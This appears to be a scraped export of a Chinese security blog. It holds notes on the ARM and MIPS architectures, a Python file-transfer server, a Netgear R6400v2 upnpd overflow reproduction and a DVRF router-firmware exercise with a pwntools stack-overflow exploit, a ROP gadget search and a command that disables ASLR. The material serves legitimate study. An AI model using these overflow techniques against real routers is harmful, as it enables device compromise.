print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode()) def deal_data(shared_key,text,sliced_num,type1,type2,type3,data_bytes,fail_array): try: sliced_sum,sliced_num,data_type,data,fail_number = unpack_data(shared_key,text) data_bytes.append(data) if fail_number is not None: fail_array.append(fail_number) if data_type == 1: type1.append(&quot;1&quot;) elif sliced_num==1 and sliced_sum ==1 and data_type == 2: type2.append(&quot;1&quot;) elif data_type == 2: type3.append(&quot;1&quot;) except Exception as e: print(f&quot;&#123;threading.current_thread().name&#125;第&#123;sliced_num&#125;组数据处理有问题 报错:&#123;e&#125;&quot;) print(f&quot;&#123;threading.current_thread().name&#125;错误切片长度为&#123;len(text)&#125;&quot;)def register(permission_value,sock,data,query_thread1,log_file,addr,login_username): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot; write_log(log_file,text) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0].decode() password = parts[1].decode() try: query_thread1.add_user(sock,username,password,addr,login_username,log_file) except Exception as e: print(e) returndef verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): addr = format(addr[0]) log_name = &quot;logfile/&quot;+addr+&quot;-log&quot; try: log_file = open(log_name,&#x27;ab+&#x27;) except Exception as e: print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;) text = f&quot;客户机&#123;addr&#125;连接成功&quot; write_log(log_file,text) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;) permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file) if permission_value == 3: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;中断连接&quot;) return print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) pool = ThreadPoolExecutor(max_workers=10) while 1: fail_array = [] sliced_num = 1 sliced_sum = 1 data_list = [] count = 0 unpack_text = [] wrong_number = [] futures = [] type1 = [] type2 = [] type3 = [] #先接收数据 再统一处理 while sliced_num &lt;= sliced_sum: text = sock.recv(1084) if len(text) == 0: print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;中断连接&quot;) text = f&quot;客户机中断连接&quot; write_log(log_file,text) sock.close() return elif len(text) != 1084: if sliced_sum != sliced_num: wrong_number.append(sliced_num) unpack_text.append(text) if count == 0: sliced_sum,sliced_num,_,_,_ = unpack_data(shared_key,text) sliced_num += 1 count = 1 else : sliced_num += 1 #判断切片大小是否符合 否则记录第一个不合格的切片编号 while 1: if len(wrong_number) != 0: while True: #清空缓存区 try: sock.settimeout(0.5) data = sock.recv(1084) except socket.timeout: break finally: sock.settimeout(None) wrong = wrong_number[0] text = f&quot;第[&#123;wrong&#125;]组切片传输发生错误 需要进行重传&quot; try: write_log(log_file,text) except Exception as e: print(e) sock.send(text.encode()) print(f&quot;&#123;threading.current_thread().name&#125;&quot;+text) sliced_num = wrong_number[0] wrong_number.clear() while sliced_num &lt;= sliced_sum: text = sock.recv(1084) if len(text) != 1084: if sliced_sum != sliced_num: wrong_number.append(sliced_num) unpack_text[sliced_num-1] = text sliced_num += 1 if len(wrong_number) != 0: continue else: break else : break if sliced_sum &lt;= 1: pool.submit(deal_data,shared_key,unpack_text[0],sliced_num,type1,type2,type3,data_list,fail_array) else: for i in range(sliced_sum): try: future = pool.submit(deal_data,shared_key,(unpack_text[i]),sliced_num,type1,type2,type3,data_list,fail_array) futures.append(future) except Exception as e: print(e) for future in futures: future.result() data_bytes = b&quot;&quot;.join(data for data in data_list) if len(type1) == sliced_sum: transfer_txt(addr,data_bytes,log_file) elif len(type2) == sliced_sum: transfer_file(sock,data_bytes,addr,log_file) elif len(type3) == sliced_sum: transfer_file2(sock,data_bytes,addr,log_file,fail_array) else : print(f&quot;&#123;threading.current_thread().name&#125;:传输过程中 data_type疑似被篡改或者发生丢包&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定 s.bind((&quot;192.168.220.130&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() 添加个人界面ui以及好友系统这一版本主要是添加一下个人界面的ui设计以及好友系统好友系统的实现 目前是打算客户端这边显示好友列表之前 先向服务端发送请求 服务端根据客户端登录的user来查询存储于数据库中的好友列表并且返回然后就是完善了一下程序运行环境的配置 使得用户使用起来更加方便目前的进度是卡在了用户头像的设置 设想是客户端本地缓存 如果需要更换头像 则传输至服务端 这样在客户端之间互相通讯的时候 可以及时更新 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"arm架构学习","slug":"arm架构学习","date":"2024-10-10T02:51:26.000Z","updated":"2025-02-23T04:27:36.213Z","comments":true,"path":"2024/10/10/arm架构学习/","link":"","permalink":"http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"环境配置sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu libc6-armhf-cross gcc-10-aarch64-linux-gnu 寄存器与先前学过的inter指令集不同的是 arm采用的是精简指令集 虽然可以更快的执行指令 但是由于指令较少 因此在实现功能的时候会比inter更加繁琐x86架构中 可以直接对内存数据进行操作 但是在arm架构中 只能通过寄存器来中转 先将内存中的数据存入寄存器再操作 这一点类似8086arm架构下 又可以细分为armel和armhf 这是在32位下 至于64位 则都是采用armhf二者的区别在于浮点运算上 他们在浮点运算时都会使用fpu寄存器 但是前者在传参的时候会使用普通寄存器 而后者在传参时则会使用fpu寄存器 所以armhf的浮点运算能力更强ARM一共有37个寄存器 其中31个32位的通用寄存器 以及6个32位的状态寄存器ARM处理器一共有7种模式用户模式(usr)：ARM处理器正常的程序执行状态。非特权模式。快速中断模式(fiq)：用于高速数据传输或通道处理。外部中断模式(irq)：用于通用的中断处理。管理模式(svc)：操作系统使用的保护模式。数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。系统模式(sys)：运行具有特权的操作系统任务。定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件协处理器的软件仿真。 32位任意处理器模式下 可使用的寄存器包含15个通用寄存器 即R0-R14还有程序计数器PC以及一两个状态寄存器R0寄存器可以用于存储临时值 也用于存储函数调用后的返回值R0~R3寄存器就负责存储调用函数的参数R7寄存器用于存储系统调用号 (这一点倒是比x86做的好 x86的rax寄存器又是存储函数返回值又是存储系统调用号的 可以通过read函数来控制rax寄存器的值 有机会实现任意函数调用 存在安全隐患R11寄存器用来存储回溯信息 也可以作为局部变量 (这里的回溯信息有点疑惑是具体指什么 如果是用来返回父函数的 又和R14寄存器冲突 希望下面的研究能够了解一下R13寄存器就是堆栈指针 指向堆栈的顶部R14寄存器类似于rbp寄存器 存储调用函数的下一条指令 供子函数返回父函数PC寄存器类似于rip寄存器 存储当前执行的目标地址 不过要特别注意的是 arm架构的pc寄存器会存储当前执行的目标地址+8 (这里具体的数值待研究 不清楚32位和64位架构是否都是8) 64位64位的arm架构这里介绍的是aarch64 属于armv8版本aarch64一共有31个通用寄存器这些寄存器既可以作为64位也可以作为32位使用作为64位使用时表示为X0 作为32位使用时表示为W0(这里的0指的是0号寄存器 其他寄存器同理)X0-X7作为参数和结果寄存器 可以作为临时寄存器以及存储函数调用过程中所需要的参数X9-X15作为调用者保存的临时寄存器 调用者如果需要用到此类寄存器的值 要先将值存入栈上 再进行调用 因为在调用结束之后 不需要恢复寄存器的值X19-X28作为被调用者保存的寄存器 这一个名称听起来拗口 实际可以理解为x64_86架构中的ebp寄存器 在进入子函数之后 会把原本的ebp存入栈上后 再将新的值存入寄存器 在返回父函数之前恢复ebp寄存器的值 这里指的就是这类寄存器特殊寄存器:X29： 帧指针寄存器（FP）类似于32位的R11寄存器X30： 链接寄存器（LR）类似于ebp寄存器X31： 堆栈指针寄存器 (SP) 类似于esp寄存器 编译并运行一个arm架构的二进制文件#include&lt;stdio.h&gt;int main()&#123; printf(&quot;%s&quot;,&quot;test\\n&quot;);&#125; 任意准备一个c语言代码 32位随后进行编译 并且通过qemu运行 arm-linux-gnueabi-gcc -o test ./test.cqemu-arm -L /usr/arm-linux-gnueabihf/ ./test 这里在使用qemu-arm时会出现两种选项qemu-arm使用小端字节序 armeb使用大端字节序使用readelf指令可以查看得到编译出来的是32位的小端序arm架构 64位aarch64-linux-gnu-gcc -o test ./test.cqemu-aarch64 -L /usr/aarch64-linux-gnu/ ./test 编译出来的是64位小端序arm架构 读懂简单程序的汇编#include&lt;stdio.h&gt;void init()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);&#125;int main()&#123; init(); printf(&quot;%s&quot;,&quot;test\\n&quot;); char buf[0x20]; read(0,buf,0x20); puts(buf);&#125; 这一部分打算从一个简单的程序 来了解arm架构的汇编语句以及基本结构 先从32位开始 32位使用gdb来动态调试 断点打在main函数的第一个语句可以得到fp寄存器即R11寄存器所说的用来存储回溯信息 实际上是存储fini数组的指针 负责终止程序而lr寄存器即R14寄存器 其相当于x64架构中的ebp寄存器 这里进入init函数 看看到时R14寄存器的值是否为main函数此时的r14寄存器值为main函数 印证猜想 而r11寄存器的值为一个指针 存储r14寄存器的值 所以这里纠正一下上面的看法 r11寄存器存储的是指向返回地址的指针回到main函数的汇编代码ADD R11, SP, #4 读取sp寄存器的值 使其加上4 结果存储在r11寄存器中下一步SUB SP, SP, #0x28 同理 读取sp寄存器的值 使其减去0x28 结果存储在sp寄存器中这两步就相当于规划出当前的栈帧空间接下来是canary保护机制的部分LDR用于将目标地址的值存储至寄存器STR用于将寄存器的值存储至目标地址之所以要将canary的值先存储至R3寄存器再存储至栈帧上的对应地址 是因为前面说过arm架构和x64架构的不同点在于 arm架构需要通过寄存器来对内存数据进行操作这里我个人觉得这一点在安全性上不如x64架构 多了一步寄存器的中转 就有存在漏洞利用的空间随后清空了r3的值 调用bl语句进入init函数 其负责控制程序执行流 跳转至对应地址或者是函数结果发现init函数并没有检查canary的操作 所以这里猜测 如果函数不涉及到栈帧内的数据变化 编译器就会作出优化 不在该函数中检查canary下图是执行setvbuf函数的汇编部分 可以看到还是通过r3寄存器来中转读取指针中的值猜测在arm架构中 r3寄存器就是作为内存数据和寄存器之间的媒介这里调用函数用到的三个参数由r1，r2，r3寄存器存储在函数结束后 通过pop把存储在栈上的寄存器值恢复 POP {R11,PC}和x64的区别在于 这里是直接传给pc指针 不过在漏洞利用的时候估计没差回到main函数 下图的三个函数调用过程就不复述了主要关注一下canary检验的部分和x64是否有什么不同将canary的值存储到r1寄存器中 将栈帧中的canary存储到r2寄存器中EORS语句对r1和r2进行异或运算 如果结果为0则说明canary一致 64位STP X29, X30, [SP,#var_40]! main函数的第一句 stp指令用于把寄存器的值存储到内存地址上这里将X29 X30寄存器的值依次存放到SP-#var_40处但是可以注意到后面加上了! 这意味着当数据操作结束后 sp的变化将会保留 也可以将其拆分为两个指令 STP X29, X30, [SP,#var_40]SUB SP,#var_40 配合下一句mov 开头两句用于腾出栈帧空间 ADRP X0, #__stack_chk_guard_ptr@PAGE adrp指令的作用是给寄存器赋值 但是不同于mov 其有一套自己的计算规则首先将pc寄存器中的值以16进制表示 并且把后3位清零再把后方的立刻数左移三位 然后将二者的结果相加赋值给寄存器下面进行示例计算 MOV PC,0xA123ADRP X0,3X0=0xA000+0x3000=0xD000 下面这一段不难理解 就是canary保护机制 把canary的值存入到栈上和32位最大的区别就是多了ADRP这一条指令跟着进入init函数 观察一下64位下是如何调用函数的依然是通过adrp和ldr的组合来获取stdout结构体的地址 接着利用X1 X2 X3三个寄存器存储函数调用需要的参数子函数结束后 返回父函数的操作值得留意一下从对应内存地址中取出X29 X30寄存器的值 操作完成后再让sp寄存器向下移动0x10 也就是+0x10随后执行ret指令 将返回地址弹到pc寄存器同样来观察一下canary的检验部分利用ADRP和LDR的组合把tlb结构体中的canary和栈上的canary分别存入到X2和X3寄存器利用SUBS指令 执行X3-X2 并将结果存入到X3寄存器中如果结果为0 说明一致 则不触发canary保护 简单的尝试 初步漏洞利用64位编写如下测试程序 #include&lt;stdio.h&gt;void init()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);&#125;int main()&#123; init(); puts(&quot;ez attack&quot;); char buf[0x20]; read(0,buf,0x100);&#125; 关闭canary和pie保护机制 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"PSV-2020-0437漏洞复现","slug":"psv-2020-0437漏洞复现","date":"2024-09-21T01:53:17.000Z","updated":"2024-12-30T13:25:42.000Z","comments":true,"path":"2024/09/21/psv-2020-0437漏洞复现/","link":"","permalink":"http://example.com/2024/09/21/psv-2020-0437%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前提本次漏洞复现 所选择的设备为 Netgear R6400v2 固件版本为1.0.4.102参照文章 https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html固件下载地址 https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip 固件提取这里下载到的固件是zip压缩文件 unzip解压后 发现需要被提取的文件格式是chk其通常是程序或者工具生成的检查点或者状态文件不过还是照常使用binwalk提取 binwalk -Me R6400v2-V1.0.4.102_10.0.75.chk 漏洞挖掘先使用firmwalker工具来大致的了解固件中可能存在的漏洞 ./firmwalker.sh ../iot/_R6400v2-V1.0.4.102_10.0.75.chk.extracted/squashfs-root ../firmwalker.txt 发现存在了telnet服务 联想到之前复现过的一个cve是通过越权开启telnet 同时存在硬编码的账密不过这题是否存在这个问题 还需要后续的挖掘先步入到usr&#x2F;sbin目录中 查看该固件涉及到的协议存在httpd和upnpd 其中upnpd所存在的漏洞相对较多 这里先重点分析一下32位小端序的arm架构 使用ida32查看反汇编代码自己看了main函数后 没发现什么端倪 于是查看了教程 发现是通过recvfrom函数来定位漏洞函数的该函数基于套接字来传输 所以利用这个函数来查找可以由我们输入的数据引发的漏洞确实是一个好思路 学到了依靠交叉索引定位到sub_1B0E0函数这里可以往v50数组中读入0x1fff的数据 下面存在一个if判断如果upnp_turn_on的值为1 并且输入的数据小于0x100字节 就可以进入sub_23FB0函数 v50数组作为a1参数在该函数一开始 利用strncpy将a1的数据复制给了v39 同时v41指针指向v39带着v42参数一起进入了sub_B9EC函数这个函数用于在v41中查找v42字符串 同时返回v41包含该字串的下一个字节的地址结合下面的代码 可以看出这里是在针对a1数组中的数据进行参数数值的提取92行出现了一个新的函数sub_22D20这个函数中也存在strncpy函数 观察一下拷贝的字节长度是否能够达到栈溢出首先是在a1字符串里查找MX: 然后再次查找\\r\\n同时对于位置进行了检测 确保\\r\\n位于MX:的后三个字节开外strncpy函数复制字节的长度为 v5-(v4+3) 也就是靠\\r\\n来决定复制的长度而v7数组的长度显然小于可以复制的长度 所以这里存在栈溢出 固件模拟这里使用qemu来进行系统模拟 #!/bin/bashsudo tunctl -t tap1 -u rootsudo ifconfig tap1 192.168.6.2sudo qemu-system-arm \\ -M vexpress-a9 \\ -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \\ -initrd ./armhf/initrd.img-3.2.0-4-vexpress \\ -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \\ -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \\ -net nic -net tap,ifname=tap1,script=no,downscript=no \\ -nographic 随后进入模拟机中配置eth0 ifconfig eth0 192.168.6.10 然后用scp传输squashfs-root文件夹到模拟机中 tar -cvf 1.tar ./squashfs-rootscp 1.tar root@192.168.6.10:/roottar -xvf 1.tar 随后挂载目录 准备运行upnp mount -t proc /proc ./squashfs-root/procmount -o bind /dev ./squashfs-root/devchroot ./squashfs-root/ /bin/sh 直接运行upnpd发现并没有回显这是因为NVRAM(非易失性RAM)用于存储路由器的配置信息 upnpd运行时需要用到其中部分的信息 在没有实体硬件的情况下 这里使用LD_PRELOAD环境变量来引导这里使用这个项目来帮助我们搭建环境https://github.com/therealsaumil/custom_nvram这里直接使用项目中已经编译好的nvram.so文件接下来执行下面指令 看看是否能够运行 LD_PRELOAD=&quot;/custom_nvram_r6250.so&quot; ./usr/sbin/upnpd 遇到了第二个报错 缺少libc.so.6libc.so.0和libc.so.6是不同版本的c标准库 数字的区别在于版本号这里直接更改名字 将libc.so.0复制一份并且修改为libc.so.6即可 cp ./lib/libc.so.0 ./lib/libc.so.6 可以看到这时候没有报错但是这里fopen打开的文件目录显然不存在 所以自己创建目录后成功运行还需要用到nvram.ini文件 在项目中有提到按照下面这样配置nvram.ini upnpd_debug_level=9lan_ipaddr=127.0.0.1hwver=R6400friendly_name=R6400upnp_enable=1upnp_turn_on=1upnp_advert_period=30upnp_advert_ttl=4upnp_portmap_entry=1upnp_duration=3600upnp_DHCPServerConfigurable=1wps_is_upnp=0upnp_sa_uuid=00000000000000000000lan_hwaddr=AA:BB:CC:DD:EE:FF 随后成功运行环境搭建到这里就结束了 有一点疑惑的是查看的教程还需要&#x2F;lib&#x2F;libdl.so.0 但是本人没有遇到这个报错 漏洞利用if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"2024CISCN华东南分区赛","slug":"2024ciscn华东南分区赛","date":"2024-06-26T12:40:51.000Z","updated":"2024-06-26T12:43:58.000Z","comments":true,"path":"2024/06/26/2024ciscn华东南分区赛/","link":"","permalink":"http://example.com/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/","excerpt":"","text":"cJSONif (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"MIPS架构学习","slug":"mips架构学习","date":"2024-02-27T07:47:06.000Z","updated":"2024-10-10T02:52:22.000Z","comments":true,"path":"2024/02/27/mips架构学习/","link":"","permalink":"http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"环境配置sudo apt-get install gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 编译及运行MIPS架构 其也包括大小端序 32位和64位32位小端序 mipsel32位大端序 mips64位小端序 mips64el64位大端序 mips64用如下所示代码编译一个32位小端序的二进制文件 并尝试使用qemu模拟运行 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;stdint.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include&lt;unistd.h&gt;void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;int main()&#123; init(); printf(&quot;%s&quot;,&quot;test\\n&quot;); char buf[0x20]; read(0,buf,0x30);&#125; 编译指令 mipsel-linux-gnu-gcc -o test test.c qemu模拟运行指令 qemu-mipsel-static -L /usr/mipsel-linux-gnu/ ./test mips寄存器这里以o32 abi接口标准为主其约定的寄存器如下此外 MIPS架构还强制要求协处理器 最多可以拥有4个固定拥有协处理器cp0其功能包括CPU配置 Cache控制 异常、中断控制 中断或异常发生时的行为和处理的定义 内存管理单元控制等等协处理器cp0一共包括32个寄存器 这里挑选几个比较重要的寄存器来记忆 $sr 状态寄存器 可以反应cpu的状态以及控制cpu$lo $hi 整数乘除法寄存器 只用来存放整数乘除法运算的结果 前者存放商 后者存放余数$pc 程序计数器 标志着当前要执行的指令 类似于x86架构中的eip$f0-$f31 浮点数寄存器 读懂简单的程序汇编这里通过上面编译出来的32位小端序程序来逐行分析汇编以main函数为例addiu和addi功能相同 为左侧操作数加上右侧的立即数 不过addiu并不会检测溢出$sp指向栈顶 这里抬高栈顶 为后续操作腾出栈空间sw(store word)将寄存器的值保存到某地址 这里将返回地址保存到$sp+0x40+0x4处下一行将栈底指针保存到$sp+0x40处move指令用于寄存器值之间的传递 这里使$fp&#x3D;$sp 将栈底指针也抬高到栈顶处前面这些操作类似于x64架构中的初始化栈帧空间以及保存返回地址以便返回到上一个执行语句li(load immediate)将立即数赋值给寄存器 这里把0x419010传给$gp 顺带下一句把$gp的值保存到了$sp+0x40-0x30处la(load address)将地址赋值给寄存器lw(load word)将某地址内的值赋值给寄存器__stack_chk_guard的地址也为0x4110a0 这两句组合起来就相当于将canary的值赋值给v0寄存器接着用sw 将v0的值存储到$fp+0x40-0x4中红框圈起来的是该语句写入的canary 而你会发现 这里实际上是往$s8+0x3c处写入 而不是$fp查阅了cyberangle师傅的博客后 得知对于gdb来说 对于$fp的操作就等于对于$s8操作上面没提及的是 $fp是30号寄存器 根据编译器的不同 30号寄存器也可以看作是$s8在介绍jal汇编指令之前 需要引入两个概念 叶子函数和非叶子函数叶子函数: 该函数中不会再调用其他函数非叶子函数: 该函数中会调用其他函数这里以另外一个程序为例来观察二者的区别 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;void vuln()&#123; return 0;&#125;int main()&#123; vuln(); puts(&quot;exit&quot;);&#125; 为了排除开启canary保护加入的stack_fail_check函数带来的影响 这里选择关闭canary保护此时按照上面的理念 可以判断出main函数调用了vuln和printf属于非叶子函数 vuln函数为叶子函数先来看非叶子函数main首先 抬栈腾出栈帧空间 随后往栈上保存返回地址和栈底指针 迁移sp指针至fp指针随后跳转执行vuln函数再来看叶子函数vuln可以明显看到 叶子函数并没有将$ra寄存器的值存放到栈上 这是因为非叶子函数需要调用到其他函数 所以将返回地址暂存到栈上 而叶子函数不必考虑这一点那么说回到jal指令 其将对应函数的地址载入ra寄存器 随后nop滑动执行函数接着以test程序的main函数来分析 看一下puts函数是如何调用的先把之前存到栈上的gp寄存器值重新赋值给寄存器lui(load upper immediate) 取立即数存到寄存器的高16位 低16位用0填充此时v0寄存器为0x00400000aTest指向存放于rodata段的test字符串 此时的addiu相当于 a0&#x3D;v0+(aTest-0x400000)随后将puts函数的地址存放到t9寄存器中jarl和jal指令的区别在于 前者会多一个存放返回地址的功能其有两种格式 jalr opt1 opt2 和jalr opt1当为前者时 返回地址存入opt2 为后者时 返回地址存入ra寄存器分析一下 像read这类需要多参数的函数如何处理可以看到三个参数是用寄存器$a0-$a2存储 不同于i386架构的32位是利用栈来传参最后来看开启了canary保护的栈帧是如何结束的重点在于beq指令 如果$v1(也就是栈上的canary)和$v0相等那么就跳转到loc_400920 否则调用stack_chk_fail函数来输出报错以及终止程序栈帧末尾 清空了v0寄存器 使其为0 和i386架构类似 后者把eax寄存器用于存储函数返回值随后把$sp挪到$fp所指向的地址 也就是最开始$sp抬高栈帧后的地址随后取回放在栈上的$ra和$fp一开始把$sp往低地址移动了0x48字节 在结束后将$sp放回去随后跳转回到$ra中存储的返回地址 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"DVRF项目学习","slug":"dvrf项目学习","date":"2024-02-25T03:31:19.000Z","updated":"2024-09-07T03:24:04.000Z","comments":true,"path":"2024/02/25/dvrf项目学习/","link":"","permalink":"http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言Damn Vulnerable Router Firmware (DVRF)是一个帮助了解x86&#x2F;64以外架构的项目 支持qemu模拟搭建环境项目地址 https://github.com/praetorian-inc/DVRF 环境配置git clone https://github.com/praetorian-inc/DVRF.git 下载项目后 使用binwalk分解出文件系统 binwalk -Me DVRF_v03.bin 该文件位于Firmware文件夹中 所涉及到的漏洞文件位于pwnable文件夹中 stack_bof_01先来看这个文件 readelf查看架构 发现是mips尝试使用qemu模拟运行一下 sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 需要在程序后面跟上参数 随便带一个aaaa试试应该是有一个空间存放输入的字符串 加上打印出了字符串 猜测可能存在溢出的情况 使用ida打开程序看看 int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [sp+18h] [+18h] BYREF char v5[198]; // [sp+1Ah] [+1Ah] BYREF v4 = 0; memset(v5, 0, sizeof(v5)); if ( argc &lt; 2 ) &#123; puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\\r\\n-By b1ack0wl\\r&quot;); exit(1); &#125; puts(&quot;Welcome to the first BoF exercise!\\r\\n\\r&quot;); strcpy((char *)&amp;v4, argv[1]); printf(&quot;You entered %s \\r\\n&quot;, (const char *)&amp;v4); puts(&quot;Try Again\\r&quot;); return 65;&#125; 首先分析一下main函数 开始对于argc参数进行了判断 其用来表示程序外部输入参数的个数初始值为1 即运行程序的指令 如果我们后续再跟入一个参数 即可以跳过if分支接下来使用strcpy函数将输入的参数复制到v4数组中 没有对写入的字节数进行限制 这里就存在栈溢出同时还存在dat_shell函数 通过执行该函数 可以直接获取shell通过对mips架构的程序了解 返回地址存储在栈上 在栈帧结束后 通过$ra寄存器进行跳转比对strcpy函数和最后的$ra寄存器值 大致可以推测出偏移为0xcc 准备利用动调来测试一下 addiu $v0, $fp, 0xE0+var_C8lw $ra, 0xE0+var_s4($sp) sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagdb-multiarch ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 可以看到偏移就为0xcc 此时我们在垃圾数据后加上漏洞函数的地址 看是否能够劫持程序执行流编写exp脚本 from pwn import*context.arch = &quot;mips&quot;context.log_level = &quot;debug&quot;# context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]payload = &quot;a&quot;*0xcc + &#x27;\\x50&#x27;+&#x27;\\\\&#x27;+&#x27;\\x09\\x40&#x27;io = process(&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 2222 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)io.interactive() 虽然此时已经劫持了返回地址 但是会发现程序卡在了这句查阅了其他师傅的博客后 发现问题出在了t9这个寄存器上如图 dal_shell函数中调用的每个函数的参数都由$t9来索引 为了成功调用函数我们还需要控制t9的值 t9的值默认为当前函数开始的地址接下来的问题在于如何控制t9寄存器利用ropper查询一下gadget 漏洞文件中未发现 查看一下libc文件 ropper -f libc.so.0 --search &quot;lw $t9&quot; 以sp寄存器为索引的地址相对来说更好控制 可以在栈溢出的时候顺便设置 这里的两句都可以使用随后关闭aslr 来减小我们做题的难度 sudo suecho 0 &gt; /proc/sys/kernel/randomize_va_space 但是在查询libc基址的时候发现 vmmap无法显示出来地址于是打算利用memset中的got表来获取真实地址断点打在执行memset函数后得到memset的真实地址 打开libc文件 查得偏移为0x1BE10计算得到libc基址那么就可以得到lw $t9该条gadget的地址了往对应的位置填入后门函数的起始地址赋值给$t9 成功执行完整exp: from pwn import*context.arch = &quot;mips&quot;context.log_level = 